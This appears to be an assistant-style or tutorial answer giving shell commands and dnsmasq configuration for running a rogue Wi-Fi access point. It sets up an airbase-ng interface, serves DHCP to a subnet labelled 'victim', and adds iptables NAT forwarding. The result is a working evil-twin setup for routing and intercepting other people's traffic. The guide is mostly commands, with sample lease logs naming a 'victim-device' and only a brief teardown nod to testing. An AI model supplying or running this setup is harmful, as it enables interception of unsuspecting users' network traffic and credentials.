...
---
---
To set up `dnsmasq` so your rogue access point dynamically assigns IP addresses via DHCP and routes traffic to provide connectivity, you need to configure the interface, create a minimalist `dnsmasq` configuration file, and enable IP forwarding.

### Prerequisites & Network Layout

* **Victim Subnet:** `10.0.0.0/24`
* **Rogue Gateway Interface (`at0`):** `10.0.0.1`
* **Internet-Connected Interface:** `eth0` (or `wlan1`, depending on where your real internet access is coming from)

---

### Step 1: Configure the Rogue Interface

Assign an IP address and subnet mask to the virtual interface generated by `airbase-ng`:
...
### Step 2: Create the `dnsmasq` Configuration

Create a basic configuration file named `dnsmasq.conf` in your local directory:

```bash
cat << EOF > dnsmasq.conf
# Bind to the rogue AP interface only
interface=at0
dhcp-authoritative

# DHCP Range: Give out IPs from 10.0.0.10 to 10.0.0.100 with a 12-hour lease
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h

# Network Gateway (Points back to your rogue interface)
dhcp-option=3,10.0.0.1

# DNS Servers provided to clients (using standard public DNS)
...
### Step 3: Enable IP Forwarding & NAT Rule

To pass internet access from your uplink interface (`eth0`) to the rogue interface (`at0`), turn on IP forwarding and configure an `iptables` NAT rule:

```bash
# Enable IPv4 packet forwarding in kernel
sudo sysctl -w net.ipv4.ip_forward=1

# Clear previous NAT rules (optional, ensures clean state)
sudo iptables -F
sudo iptables -t nat -F

# Route traffic out through your internet interface (eth0)
sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT

```

*(Replace `eth0` with the actual name of the network adapter connected to the internet, e.g., `wlan1`).*

---

### Step 4: Launch `dnsmasq`

Run `dnsmasq` in the foreground pointing to your configuration file so you can monitor DHCP allocations:
...
When a device joins your rogue AP, you will see output in your terminal indicating a IP lease has been assigned:

```text
dnsmasq-dhcp: DHCPREQUEST(at0) 10.0.0.15 aa:bb:cc:dd:ee:ff
dnsmasq-dhcp: DHCPACK(at0) 10.0.0.15 aa:bb:cc:dd:ee:ff victim-device

```

---

### Step 5: Teardown (When Complete)

Once testing is concluded, terminate `dnsmasq` (`Ctrl+C`) and reset network routing:

```bash
sudo killall dnsmasq
sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -t nat -D POSTROUTING --out-interface eth0 -j MASQUERADE
